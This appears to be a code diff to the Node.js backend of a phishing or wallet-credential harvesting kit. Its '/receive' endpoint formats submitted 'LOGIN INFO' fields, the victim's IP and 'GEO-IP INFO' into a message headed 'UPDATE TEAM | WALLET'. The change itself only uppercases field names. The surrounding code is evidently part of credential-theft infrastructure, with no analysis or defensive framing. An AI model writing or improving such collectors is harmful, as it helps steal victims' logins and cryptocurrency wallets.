@@ -85,9 +85,10 @@ app.post('/receive', async (req, res) => {
     message += `✅ UPDATE TEAM | WALLET | USER_${ipAddress}\n\n` +
                `👤 LOGIN INFO\n\n`;
 
-    for (const key of myObjects) {
+    for (let key of myObjects) {
+    	
       console.log(`${key}: ${myObject[key]}`);
-      message += `${key}: ${myObject[key]}\n`;
+      message += `${key.toUpperCase()}: ${myObject[key]}\n`;
     }
     
     message += `🌍 GEO-IP INFO\n` +
